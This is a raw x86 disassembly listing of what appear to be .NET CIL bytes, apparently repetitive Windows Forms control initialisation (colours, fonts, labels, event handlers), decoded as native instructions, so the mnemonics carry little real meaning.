  402fcb:	42                   	inc    %edx
  402fcc:	00 00                	add    %al,(%eax)
  402fce:	0a 00                	or     (%eax),%al
  402fd0:	02 7b 24             	add    0x24(%ebx),%bh
  402fd3:	00 00                	add    %al,(%eax)
  402fd5:	04 16                	add    $0x16,%al
  402fd7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd8:	43                   	inc    %ebx
  402fd9:	00 00                	add    %al,(%eax)
  402fdb:	0a 00                	or     (%eax),%al
  402fdd:	02 7b 24             	add    0x24(%ebx),%bh
  402fe0:	00 00                	add    %al,(%eax)
  402fe2:	04 72                	add    $0x72,%al
  402fe4:	eb 01                	jmp    0x402fe7
  402fe6:	00 70 22             	add    %dh,0x22(%eax)
  402fe9:	00 00                	add    %al,(%eax)
  402feb:	10 41 16             	adc    %al,0x16(%ecx)
  402fee:	19 20                	sbb    %esp,(%eax)
  402ff0:	a2 00 00 00 73       	mov    %al,0x73000000
  402ff5:	44                   	inc    %esp
  402ff6:	00 00                	add    %al,(%eax)
  402ff8:	0a 6f 45             	or     0x45(%edi),%ch
  402ffb:	00 00                	add    %al,(%eax)
  402ffd:	0a 00                	or     (%eax),%al
  402fff:	02 7b 24             	add    0x24(%ebx),%bh
  403002:	00 00                	add    %al,(%eax)
  403004:	04 20                	add    $0x20,%al
  403006:	f9                   	stc
  403007:	00 00                	add    %al,(%eax)
  403009:	00 20                	add    %ah,(%eax)
  40300b:	de 00                	fiadds (%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	20 c9                	and    %cl,%cl
  403011:	00 00                	add    %al,(%eax)
  403013:	00 28                	add    %ch,(%eax)
  403015:	32 00                	xor    (%eax),%al
  403017:	00 0a                	add    %cl,(%edx)
  403019:	6f                   	outsl  %ds:(%esi),(%dx)
  40301a:	46                   	inc    %esi
  40301b:	00 00                	add    %al,(%eax)
  40301d:	0a 00                	or     (%eax),%al
  40301f:	02 7b 24             	add    0x24(%ebx),%bh
  403022:	00 00                	add    %al,(%eax)
  403024:	04 1f                	add    $0x1f,%al
  403026:	56                   	push   %esi
  403027:	20 84 00 00 00 73 35 	and    %al,0x35730000(%eax,%eax,1)
  40302e:	00 00                	add    %al,(%eax)
  403030:	0a 6f 36             	or     0x36(%edi),%ch
  403033:	00 00                	add    %al,(%eax)
  403035:	0a 00                	or     (%eax),%al
  403037:	02 7b 24             	add    0x24(%ebx),%bh
  40303a:	00 00                	add    %al,(%eax)
  40303c:	04 72                	add    $0x72,%al
  40303e:	ab                   	stos   %eax,%es:(%edi)
  40303f:	02 00                	add    (%eax),%al
  403041:	70 6f                	jo     0x4030b2
  403043:	37                   	aaa
  403044:	00 00                	add    %al,(%eax)
  403046:	0a 00                	or     (%eax),%al
  403048:	02 7b 24             	add    0x24(%ebx),%bh
  40304b:	00 00                	add    %al,(%eax)
  40304d:	04 1f                	add    $0x1f,%al
  40304f:	40                   	inc    %eax
  403050:	1f                   	pop    %ds
  403051:	1b 73 38             	sbb    0x38(%ebx),%esi
  403054:	00 00                	add    %al,(%eax)
  403056:	0a 6f 39             	or     0x39(%edi),%ch
  403059:	00 00                	add    %al,(%eax)
  40305b:	0a 00                	or     (%eax),%al
  40305d:	02 7b 24             	add    0x24(%ebx),%bh
  403060:	00 00                	add    %al,(%eax)
  403062:	04 1f                	add    $0x1f,%al
  403064:	12 6f 3a             	adc    0x3a(%edi),%ch
  403067:	00 00                	add    %al,(%eax)
  403069:	0a 00                	or     (%eax),%al
  40306b:	02 7b 24             	add    0x24(%ebx),%bh
  40306e:	00 00                	add    %al,(%eax)
  403070:	04 72                	add    $0x72,%al
  403072:	bd 02 00 70 6f       	mov    $0x6f700002,%ebp
  403077:	47                   	inc    %edi
  403078:	00 00                	add    %al,(%eax)
  40307a:	0a 00                	or     (%eax),%al
  40307c:	02 7b 24             	add    0x24(%ebx),%bh
  40307f:	00 00                	add    %al,(%eax)
  403081:	04 18                	add    $0x18,%al
  403083:	6f                   	outsl  %ds:(%esi),(%dx)
  403084:	50                   	push   %eax
  403085:	00 00                	add    %al,(%eax)
  403087:	0a 00                	or     (%eax),%al
  403089:	02 7b 24             	add    0x24(%ebx),%bh
  40308c:	00 00                	add    %al,(%eax)
  40308e:	04 16                	add    $0x16,%al
  403090:	6f                   	outsl  %ds:(%esi),(%dx)
  403091:	48                   	dec    %eax
  403092:	00 00                	add    %al,(%eax)
  403094:	0a 00                	or     (%eax),%al
  403096:	02 7b 24             	add    0x24(%ebx),%bh
  403099:	00 00                	add    %al,(%eax)
  40309b:	04 02                	add    $0x2,%al
  40309d:	fe 06                	incb   (%esi)
  40309f:	13 00                	adc    (%eax),%eax
  4030a1:	00 06                	add    %al,(%esi)
  4030a3:	73 49                	jae    0x4030ee
  4030a5:	00 00                	add    %al,(%eax)
  4030a7:	0a 6f 4a             	or     0x4a(%edi),%ch
  4030aa:	00 00                	add    %al,(%eax)
  4030ac:	0a 00                	or     (%eax),%al
  4030ae:	02 7b 12             	add    0x12(%ebx),%bh
  4030b1:	00 00                	add    %al,(%eax)
  4030b3:	04 17                	add    $0x17,%al
  4030b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b6:	3e 00 00             	add    %al,%ds:(%eax)
  4030b9:	0a 00                	or     (%eax),%al
  4030bb:	02 7b 12             	add    0x12(%ebx),%bh
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	04 20                	add    $0x20,%al
  4030c2:	d8 00                	fadds  (%eax)
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	16                   	push   %ss
  4030c7:	1f                   	pop    %ds
  4030c8:	32 28                	xor    (%eax),%ch
  4030ca:	32 00                	xor    (%eax),%al
  4030cc:	00 0a                	add    %cl,(%edx)
  4030ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cf:	33 00                	xor    (%eax),%eax
  4030d1:	00 0a                	add    %cl,(%edx)
  4030d3:	00 02                	add    %al,(%edx)
  4030d5:	7b 12                	jnp    0x4030e9
  4030d7:	00 00                	add    %al,(%eax)
  4030d9:	04 6f                	add    $0x6f,%al
  4030db:	3f                   	aas
  4030dc:	00 00                	add    %al,(%eax)
  4030de:	0a 20                	or     (%eax),%ah
  4030e0:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	00 20                	add    %ah,(%eax)
  4030ea:	a2 00 00 00 28       	mov    %al,0x28000000
  4030ef:	32 00                	xor    (%eax),%al
  4030f1:	00 0a                	add    %cl,(%edx)
  4030f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4030f4:	40                   	inc    %eax
  4030f5:	00 00                	add    %al,(%eax)
  4030f7:	0a 00                	or     (%eax),%al
  4030f9:	02 7b 12             	add    0x12(%ebx),%bh
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	04 6f                	add    $0x6f,%al
  403100:	3f                   	aas
  403101:	00 00                	add    %al,(%eax)
  403103:	0a 20                	or     (%eax),%ah
  403105:	d8 00                	fadds  (%eax)
  403107:	00 00                	add    %al,(%eax)
  403109:	16                   	push   %ss
  40310a:	1f                   	pop    %ds
  40310b:	32 28                	xor    (%eax),%ch
  40310d:	32 00                	xor    (%eax),%al
  40310f:	00 0a                	add    %cl,(%edx)
  403111:	6f                   	outsl  %ds:(%esi),(%dx)
  403112:	41                   	inc    %ecx
  403113:	00 00                	add    %al,(%eax)
  403115:	0a 00                	or     (%eax),%al
  403117:	02 7b 12             	add    0x12(%ebx),%bh
  40311a:	00 00                	add    %al,(%eax)
  40311c:	04 6f                	add    $0x6f,%al
  40311e:	3f                   	aas
  40311f:	00 00                	add    %al,(%eax)
  403121:	0a 20                	or     (%eax),%ah
  403123:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403129:	00 00                	add    %al,(%eax)
  40312b:	00 20                	add    %ah,(%eax)
  40312d:	a2 00 00 00 28       	mov    %al,0x28000000
  403132:	32 00                	xor    (%eax),%al
  403134:	00 0a                	add    %cl,(%edx)
  403136:	6f                   	outsl  %ds:(%esi),(%dx)
  403137:	42                   	inc    %edx
  403138:	00 00                	add    %al,(%eax)
  40313a:	0a 00                	or     (%eax),%al
  40313c:	02 7b 12             	add    0x12(%ebx),%bh
  40313f:	00 00                	add    %al,(%eax)
  403141:	04 16                	add    $0x16,%al
  403143:	6f                   	outsl  %ds:(%esi),(%dx)
  403144:	43                   	inc    %ebx
  403145:	00 00                	add    %al,(%eax)
  403147:	0a 00                	or     (%eax),%al
  403149:	02 7b 12             	add    0x12(%ebx),%bh
  40314c:	00 00                	add    %al,(%eax)
  40314e:	04 72                	add    $0x72,%al
  403150:	eb 01                	jmp    0x403153
  403152:	00 70 22             	add    %dh,0x22(%eax)
  403155:	00 00                	add    %al,(%eax)
  403157:	10 41 16             	adc    %al,0x16(%ecx)
  40315a:	19 20                	sbb    %esp,(%eax)
  40315c:	a2 00 00 00 73       	mov    %al,0x73000000
  403161:	44                   	inc    %esp
  403162:	00 00                	add    %al,(%eax)
  403164:	0a 6f 45             	or     0x45(%edi),%ch
  403167:	00 00                	add    %al,(%eax)
  403169:	0a 00                	or     (%eax),%al
  40316b:	02 7b 12             	add    0x12(%ebx),%bh
  40316e:	00 00                	add    %al,(%eax)
  403170:	04 20                	add    $0x20,%al
  403172:	f9                   	stc
  403173:	00 00                	add    %al,(%eax)
  403175:	00 20                	add    %ah,(%eax)
  403177:	de 00                	fiadds (%eax)
  403179:	00 00                	add    %al,(%eax)
  40317b:	20 c9                	and    %cl,%cl
  40317d:	00 00                	add    %al,(%eax)
  40317f:	00 28                	add    %ch,(%eax)
  403181:	32 00                	xor    (%eax),%al
  403183:	00 0a                	add    %cl,(%edx)
  403185:	6f                   	outsl  %ds:(%esi),(%dx)
  403186:	46                   	inc    %esi
  403187:	00 00                	add    %al,(%eax)
  403189:	0a 00                	or     (%eax),%al
  40318b:	02 7b 12             	add    0x12(%ebx),%bh
  40318e:	00 00                	add    %al,(%eax)
  403190:	04 1f                	add    $0x1f,%al
  403192:	56                   	push   %esi
  403193:	1f                   	pop    %ds
  403194:	21 73 35             	and    %esi,0x35(%ebx)
  403197:	00 00                	add    %al,(%eax)
  403199:	0a 6f 36             	or     0x36(%edi),%ch
  40319c:	00 00                	add    %al,(%eax)
  40319e:	0a 00                	or     (%eax),%al
  4031a0:	02 7b 12             	add    0x12(%ebx),%bh
  4031a3:	00 00                	add    %al,(%eax)
  4031a5:	04 72                	add    $0x72,%al
  4031a7:	c5 02                	lds    (%edx),%eax
  4031a9:	00 70 6f             	add    %dh,0x6f(%eax)
  4031ac:	37                   	aaa
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	0a 00                	or     (%eax),%al
  4031b1:	02 7b 12             	add    0x12(%ebx),%bh
  4031b4:	00 00                	add    %al,(%eax)
  4031b6:	04 1f                	add    $0x1f,%al
  4031b8:	40                   	inc    %eax
  4031b9:	1f                   	pop    %ds
  4031ba:	1b 73 38             	sbb    0x38(%ebx),%esi
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	0a 6f 39             	or     0x39(%edi),%ch
  4031c2:	00 00                	add    %al,(%eax)
  4031c4:	0a 00                	or     (%eax),%al
  4031c6:	02 7b 12             	add    0x12(%ebx),%bh
  4031c9:	00 00                	add    %al,(%eax)
  4031cb:	04 1f                	add    $0x1f,%al
  4031cd:	11 6f 3a             	adc    %ebp,0x3a(%edi)
  4031d0:	00 00                	add    %al,(%eax)
  4031d2:	0a 00                	or     (%eax),%al
  4031d4:	02 7b 12             	add    0x12(%ebx),%bh
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	04 72                	add    $0x72,%al
  4031db:	d7                   	xlat   %ds:(%ebx)
  4031dc:	02 00                	add    (%eax),%al
  4031de:	70 6f                	jo     0x40324f
  4031e0:	47                   	inc    %edi
  4031e1:	00 00                	add    %al,(%eax)
  4031e3:	0a 00                	or     (%eax),%al
  4031e5:	02 7b 12             	add    0x12(%ebx),%bh
  4031e8:	00 00                	add    %al,(%eax)
  4031ea:	04 18                	add    $0x18,%al
  4031ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ed:	50                   	push   %eax
  4031ee:	00 00                	add    %al,(%eax)
  4031f0:	0a 00                	or     (%eax),%al
  4031f2:	02 7b 12             	add    0x12(%ebx),%bh
  4031f5:	00 00                	add    %al,(%eax)
  4031f7:	04 16                	add    $0x16,%al
  4031f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4031fa:	48                   	dec    %eax
  4031fb:	00 00                	add    %al,(%eax)
  4031fd:	0a 00                	or     (%eax),%al
  4031ff:	02 7b 12             	add    0x12(%ebx),%bh
  403202:	00 00                	add    %al,(%eax)
  403204:	04 02                	add    $0x2,%al
  403206:	fe 06                	incb   (%esi)
  403208:	10 00                	adc    %al,(%eax)
  40320a:	00 06                	add    %al,(%esi)
  40320c:	73 49                	jae    0x403257
  40320e:	00 00                	add    %al,(%eax)
  403210:	0a 6f 4a             	or     0x4a(%edi),%ch
  403213:	00 00                	add    %al,(%eax)
  403215:	0a 00                	or     (%eax),%al
  403217:	02 7b 13             	add    0x13(%ebx),%bh
  40321a:	00 00                	add    %al,(%eax)
  40321c:	04 17                	add    $0x17,%al
  40321e:	6f                   	outsl  %ds:(%esi),(%dx)
  40321f:	3e 00 00             	add    %al,%ds:(%eax)
  403222:	0a 00                	or     (%eax),%al
  403224:	02 7b 13             	add    0x13(%ebx),%bh
  403227:	00 00                	add    %al,(%eax)
  403229:	04 20                	add    $0x20,%al
  40322b:	d8 00                	fadds  (%eax)
  40322d:	00 00                	add    %al,(%eax)
  40322f:	16                   	push   %ss
  403230:	1f                   	pop    %ds
  403231:	32 28                	xor    (%eax),%ch
  403233:	32 00                	xor    (%eax),%al
  403235:	00 0a                	add    %cl,(%edx)
  403237:	6f                   	outsl  %ds:(%esi),(%dx)
  403238:	33 00                	xor    (%eax),%eax
  40323a:	00 0a                	add    %cl,(%edx)
  40323c:	00 02                	add    %al,(%edx)
  40323e:	7b 13                	jnp    0x403253
  403240:	00 00                	add    %al,(%eax)
  403242:	04 6f                	add    $0x6f,%al
  403244:	3f                   	aas
  403245:	00 00                	add    %al,(%eax)
  403247:	0a 20                	or     (%eax),%ah
  403249:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40324f:	00 00                	add    %al,(%eax)
  403251:	00 20                	add    %ah,(%eax)
  403253:	a2 00 00 00 28       	mov    %al,0x28000000
  403258:	32 00                	xor    (%eax),%al
  40325a:	00 0a                	add    %cl,(%edx)
  40325c:	6f                   	outsl  %ds:(%esi),(%dx)
  40325d:	40                   	inc    %eax
  40325e:	00 00                	add    %al,(%eax)
  403260:	0a 00                	or     (%eax),%al
  403262:	02 7b 13             	add    0x13(%ebx),%bh
  403265:	00 00                	add    %al,(%eax)
  403267:	04 6f                	add    $0x6f,%al
  403269:	3f                   	aas
  40326a:	00 00                	add    %al,(%eax)
  40326c:	0a 20                	or     (%eax),%ah
  40326e:	d8 00                	fadds  (%eax)
  403270:	00 00                	add    %al,(%eax)
  403272:	16                   	push   %ss
  403273:	1f                   	pop    %ds
  403274:	32 28                	xor    (%eax),%ch
  403276:	32 00                	xor    (%eax),%al
  403278:	00 0a                	add    %cl,(%edx)
  40327a:	6f                   	outsl  %ds:(%esi),(%dx)
  40327b:	41                   	inc    %ecx
  40327c:	00 00                	add    %al,(%eax)
  40327e:	0a 00                	or     (%eax),%al
  403280:	02 7b 13             	add    0x13(%ebx),%bh
  403283:	00 00                	add    %al,(%eax)
  403285:	04 6f                	add    $0x6f,%al
  403287:	3f                   	aas
  403288:	00 00                	add    %al,(%eax)
  40328a:	0a 20                	or     (%eax),%ah
  40328c:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403292:	00 00                	add    %al,(%eax)
  403294:	00 20                	add    %ah,(%eax)
  403296:	a2 00 00 00 28       	mov    %al,0x28000000
  40329b:	32 00                	xor    (%eax),%al
  40329d:	00 0a                	add    %cl,(%edx)
  40329f:	6f                   	outsl  %ds:(%esi),(%dx)
  4032a0:	42                   	inc    %edx
  4032a1:	00 00                	add    %al,(%eax)
  4032a3:	0a 00                	or     (%eax),%al
  4032a5:	02 7b 13             	add    0x13(%ebx),%bh
  4032a8:	00 00                	add    %al,(%eax)
  4032aa:	04 16                	add    $0x16,%al
  4032ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ad:	43                   	inc    %ebx
  4032ae:	00 00                	add    %al,(%eax)
  4032b0:	0a 00                	or     (%eax),%al
  4032b2:	02 7b 13             	add    0x13(%ebx),%bh
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	04 72                	add    $0x72,%al
  4032b9:	eb 01                	jmp    0x4032bc
  4032bb:	00 70 22             	add    %dh,0x22(%eax)
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	10 41 16             	adc    %al,0x16(%ecx)
  4032c3:	19 20                	sbb    %esp,(%eax)
  4032c5:	a2 00 00 00 73       	mov    %al,0x73000000
  4032ca:	44                   	inc    %esp
  4032cb:	00 00                	add    %al,(%eax)
  4032cd:	0a 6f 45             	or     0x45(%edi),%ch
  4032d0:	00 00                	add    %al,(%eax)
  4032d2:	0a 00                	or     (%eax),%al
  4032d4:	02 7b 13             	add    0x13(%ebx),%bh
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	04 20                	add    $0x20,%al
  4032db:	f9                   	stc
  4032dc:	00 00                	add    %al,(%eax)
  4032de:	00 20                	add    %ah,(%eax)
  4032e0:	de 00                	fiadds (%eax)
  4032e2:	00 00                	add    %al,(%eax)
  4032e4:	20 c9                	and    %cl,%cl
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	00 28                	add    %ch,(%eax)
  4032ea:	32 00                	xor    (%eax),%al
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ef:	46                   	inc    %esi
  4032f0:	00 00                	add    %al,(%eax)
  4032f2:	0a 00                	or     (%eax),%al
  4032f4:	02 7b 13             	add    0x13(%ebx),%bh
  4032f7:	00 00                	add    %al,(%eax)
  4032f9:	04 1f                	add    $0x1f,%al
  4032fb:	56                   	push   %esi
  4032fc:	1f                   	pop    %ds
  4032fd:	63 73 35             	arpl   %esi,0x35(%ebx)
  403300:	00 00                	add    %al,(%eax)
  403302:	0a 6f 36             	or     0x36(%edi),%ch
  403305:	00 00                	add    %al,(%eax)
  403307:	0a 00                	or     (%eax),%al
  403309:	02 7b 13             	add    0x13(%ebx),%bh
  40330c:	00 00                	add    %al,(%eax)
  40330e:	04 72                	add    $0x72,%al
  403310:	e1 02                	loope  0x403314
  403312:	00 70 6f             	add    %dh,0x6f(%eax)
  403315:	37                   	aaa
  403316:	00 00                	add    %al,(%eax)
  403318:	0a 00                	or     (%eax),%al
  40331a:	02 7b 13             	add    0x13(%ebx),%bh
  40331d:	00 00                	add    %al,(%eax)
  40331f:	04 1f                	add    $0x1f,%al
  403321:	40                   	inc    %eax
  403322:	1f                   	pop    %ds
  403323:	1b 73 38             	sbb    0x38(%ebx),%esi
  403326:	00 00                	add    %al,(%eax)
  403328:	0a 6f 39             	or     0x39(%edi),%ch
  40332b:	00 00                	add    %al,(%eax)
  40332d:	0a 00                	or     (%eax),%al
  40332f:	02 7b 13             	add    0x13(%ebx),%bh
  403332:	00 00                	add    %al,(%eax)
  403334:	04 1f                	add    $0x1f,%al
  403336:	10 6f 3a             	adc    %ch,0x3a(%edi)
  403339:	00 00                	add    %al,(%eax)
  40333b:	0a 00                	or     (%eax),%al
  40333d:	02 7b 13             	add    0x13(%ebx),%bh
  403340:	00 00                	add    %al,(%eax)
  403342:	04 72                	add    $0x72,%al
  403344:	f1                   	int1
  403345:	02 00                	add    (%eax),%al
  403347:	70 6f                	jo     0x4033b8
  403349:	47                   	inc    %edi
  40334a:	00 00                	add    %al,(%eax)
  40334c:	0a 00                	or     (%eax),%al
  40334e:	02 7b 13             	add    0x13(%ebx),%bh
  403351:	00 00                	add    %al,(%eax)
  403353:	04 18                	add    $0x18,%al
  403355:	6f                   	outsl  %ds:(%esi),(%dx)
  403356:	50                   	push   %eax
  403357:	00 00                	add    %al,(%eax)
  403359:	0a 00                	or     (%eax),%al
  40335b:	02 7b 13             	add    0x13(%ebx),%bh
  40335e:	00 00                	add    %al,(%eax)
  403360:	04 16                	add    $0x16,%al
  403362:	6f                   	outsl  %ds:(%esi),(%dx)
  403363:	48                   	dec    %eax
  403364:	00 00                	add    %al,(%eax)
  403366:	0a 00                	or     (%eax),%al
  403368:	02 7b 13             	add    0x13(%ebx),%bh
  40336b:	00 00                	add    %al,(%eax)
  40336d:	04 02                	add    $0x2,%al
  40336f:	fe 06                	incb   (%esi)
  403371:	12 00                	adc    (%eax),%al
  403373:	00 06                	add    %al,(%esi)
  403375:	73 49                	jae    0x4033c0
  403377:	00 00                	add    %al,(%eax)
  403379:	0a 6f 4a             	or     0x4a(%edi),%ch
  40337c:	00 00                	add    %al,(%eax)
  40337e:	0a 00                	or     (%eax),%al
  403380:	02 7b 14             	add    0x14(%ebx),%bh
  403383:	00 00                	add    %al,(%eax)
  403385:	04 17                	add    $0x17,%al
  403387:	6f                   	outsl  %ds:(%esi),(%dx)
  403388:	3e 00 00             	add    %al,%ds:(%eax)
  40338b:	0a 00                	or     (%eax),%al
  40338d:	02 7b 14             	add    0x14(%ebx),%bh
  403390:	00 00                	add    %al,(%eax)
  403392:	04 20                	add    $0x20,%al
  403394:	d8 00                	fadds  (%eax)
  403396:	00 00                	add    %al,(%eax)
  403398:	16                   	push   %ss
  403399:	1f                   	pop    %ds
  40339a:	32 28                	xor    (%eax),%ch
  40339c:	32 00                	xor    (%eax),%al
  40339e:	00 0a                	add    %cl,(%edx)
  4033a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a1:	33 00                	xor    (%eax),%eax
  4033a3:	00 0a                	add    %cl,(%edx)
  4033a5:	00 02                	add    %al,(%edx)
  4033a7:	7b 14                	jnp    0x4033bd
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	04 6f                	add    $0x6f,%al
  4033ad:	3f                   	aas
  4033ae:	00 00                	add    %al,(%eax)
  4033b0:	0a 20                	or     (%eax),%ah
  4033b2:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4033b8:	00 00                	add    %al,(%eax)
  4033ba:	00 20                	add    %ah,(%eax)
  4033bc:	a2 00 00 00 28       	mov    %al,0x28000000
  4033c1:	32 00                	xor    (%eax),%al
  4033c3:	00 0a                	add    %cl,(%edx)
  4033c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4033c6:	40                   	inc    %eax
  4033c7:	00 00                	add    %al,(%eax)
  4033c9:	0a 00                	or     (%eax),%al
  4033cb:	02 7b 14             	add    0x14(%ebx),%bh
  4033ce:	00 00                	add    %al,(%eax)
  4033d0:	04 6f                	add    $0x6f,%al
  4033d2:	3f                   	aas
  4033d3:	00 00                	add    %al,(%eax)
  4033d5:	0a 20                	or     (%eax),%ah
  4033d7:	d8 00                	fadds  (%eax)
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	16                   	push   %ss
  4033dc:	1f                   	pop    %ds
  4033dd:	32 28                	xor    (%eax),%ch
  4033df:	32 00                	xor    (%eax),%al
  4033e1:	00 0a                	add    %cl,(%edx)
  4033e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e4:	41                   	inc    %ecx
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	0a 00                	or     (%eax),%al
  4033e9:	02 7b 14             	add    0x14(%ebx),%bh
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	04 6f                	add    $0x6f,%al
  4033f0:	3f                   	aas
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	0a 20                	or     (%eax),%ah
  4033f5:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4033fb:	00 00                	add    %al,(%eax)
  4033fd:	00 20                	add    %ah,(%eax)
  4033ff:	a2 00 00 00 28       	mov    %al,0x28000000
  403404:	32 00                	xor    (%eax),%al
  403406:	00 0a                	add    %cl,(%edx)
  403408:	6f                   	outsl  %ds:(%esi),(%dx)
  403409:	42                   	inc    %edx
  40340a:	00 00                	add    %al,(%eax)
  40340c:	0a 00                	or     (%eax),%al
  40340e:	02 7b 14             	add    0x14(%ebx),%bh
  403411:	00 00                	add    %al,(%eax)
  403413:	04 16                	add    $0x16,%al
  403415:	6f                   	outsl  %ds:(%esi),(%dx)
  403416:	43                   	inc    %ebx
  403417:	00 00                	add    %al,(%eax)
  403419:	0a 00                	or     (%eax),%al
  40341b:	02 7b 14             	add    0x14(%ebx),%bh
  40341e:	00 00                	add    %al,(%eax)
  403420:	04 72                	add    $0x72,%al
  403422:	eb 01                	jmp    0x403425
  403424:	00 70 22             	add    %dh,0x22(%eax)
  403427:	00 00                	add    %al,(%eax)
  403429:	10 41 16             	adc    %al,0x16(%ecx)
  40342c:	19 20                	sbb    %esp,(%eax)
  40342e:	a2 00 00 00 73       	mov    %al,0x73000000
  403433:	44                   	inc    %esp
  403434:	00 00                	add    %al,(%eax)
  403436:	0a 6f 45             	or     0x45(%edi),%ch
  403439:	00 00                	add    %al,(%eax)
  40343b:	0a 00                	or     (%eax),%al
  40343d:	02 7b 14             	add    0x14(%ebx),%bh
  403440:	00 00                	add    %al,(%eax)
  403442:	04 20                	add    $0x20,%al
  403444:	f9                   	stc
  403445:	00 00                	add    %al,(%eax)
  403447:	00 20                	add    %ah,(%eax)
  403449:	de 00                	fiadds (%eax)
  40344b:	00 00                	add    %al,(%eax)
  40344d:	20 c9                	and    %cl,%cl
  40344f:	00 00                	add    %al,(%eax)
  403451:	00 28                	add    %ch,(%eax)
  403453:	32 00                	xor    (%eax),%al
  403455:	00 0a                	add    %cl,(%edx)
  403457:	6f                   	outsl  %ds:(%esi),(%dx)
  403458:	46                   	inc    %esi
  403459:	00 00                	add    %al,(%eax)
  40345b:	0a 00                	or     (%eax),%al
  40345d:	02 7b 14             	add    0x14(%ebx),%bh
  403460:	00 00                	add    %al,(%eax)
  403462:	04 1f                	add    $0x1f,%al
  403464:	56                   	push   %esi
  403465:	1f                   	pop    %ds
  403466:	42                   	inc    %edx
  403467:	73 35                	jae    0x40349e
  403469:	00 00                	add    %al,(%eax)
  40346b:	0a 6f 36             	or     0x36(%edi),%ch
  40346e:	00 00                	add    %al,(%eax)
  403470:	0a 00                	or     (%eax),%al
  403472:	02 7b 14             	add    0x14(%ebx),%bh
  403475:	00 00                	add    %al,(%eax)
  403477:	04 72                	add    $0x72,%al
  403479:	fb                   	sti
  40347a:	02 00                	add    (%eax),%al
  40347c:	70 6f                	jo     0x4034ed
  40347e:	37                   	aaa
  40347f:	00 00                	add    %al,(%eax)
  403481:	0a 00                	or     (%eax),%al
  403483:	02 7b 14             	add    0x14(%ebx),%bh
  403486:	00 00                	add    %al,(%eax)
  403488:	04 1f                	add    $0x1f,%al
  40348a:	40                   	inc    %eax
  40348b:	1f                   	pop    %ds
  40348c:	1b 73 38             	sbb    0x38(%ebx),%esi
  40348f:	00 00                	add    %al,(%eax)
  403491:	0a 6f 39             	or     0x39(%edi),%ch
  403494:	00 00                	add    %al,(%eax)
  403496:	0a 00                	or     (%eax),%al
  403498:	02 7b 14             	add    0x14(%ebx),%bh
  40349b:	00 00                	add    %al,(%eax)
  40349d:	04 1f                	add    $0x1f,%al
  40349f:	0f 6f 3a             	movq   (%edx),%mm7
  4034a2:	00 00                	add    %al,(%eax)
  4034a4:	0a 00                	or     (%eax),%al
  4034a6:	02 7b 14             	add    0x14(%ebx),%bh
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	04 72                	add    $0x72,%al
  4034ad:	0b 03                	or     (%ebx),%eax
  4034af:	00 70 6f             	add    %dh,0x6f(%eax)
  4034b2:	47                   	inc    %edi
  4034b3:	00 00                	add    %al,(%eax)
  4034b5:	0a 00                	or     (%eax),%al
  4034b7:	02 7b 14             	add    0x14(%ebx),%bh
  4034ba:	00 00                	add    %al,(%eax)
  4034bc:	04 18                	add    $0x18,%al
  4034be:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bf:	50                   	push   %eax
  4034c0:	00 00                	add    %al,(%eax)
  4034c2:	0a 00                	or     (%eax),%al
  4034c4:	02 7b 14             	add    0x14(%ebx),%bh
  4034c7:	00 00                	add    %al,(%eax)
  4034c9:	04 16                	add    $0x16,%al
  4034cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4034cc:	48                   	dec    %eax
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 00                	or     (%eax),%al
  4034d1:	02 7b 14             	add    0x14(%ebx),%bh
  4034d4:	00 00                	add    %al,(%eax)
  4034d6:	04 02                	add    $0x2,%al
  4034d8:	fe 06                	incb   (%esi)
  4034da:	11 00                	adc    %eax,(%eax)
  4034dc:	00 06                	add    %al,(%esi)
  4034de:	73 49                	jae    0x403529
  4034e0:	00 00                	add    %al,(%eax)
  4034e2:	0a 6f 4a             	or     0x4a(%edi),%ch
  4034e5:	00 00                	add    %al,(%eax)
  4034e7:	0a 00                	or     (%eax),%al
  4034e9:	02 7b 15             	add    0x15(%ebx),%bh
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	04 17                	add    $0x17,%al
  4034f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f1:	3e 00 00             	add    %al,%ds:(%eax)
  4034f4:	0a 00                	or     (%eax),%al
  4034f6:	02 7b 15             	add    0x15(%ebx),%bh
  4034f9:	00 00                	add    %al,(%eax)
  4034fb:	04 20                	add    $0x20,%al
  4034fd:	d8 00                	fadds  (%eax)
  4034ff:	00 00                	add    %al,(%eax)
  403501:	16                   	push   %ss
  403502:	1f                   	pop    %ds
  403503:	32 28                	xor    (%eax),%ch
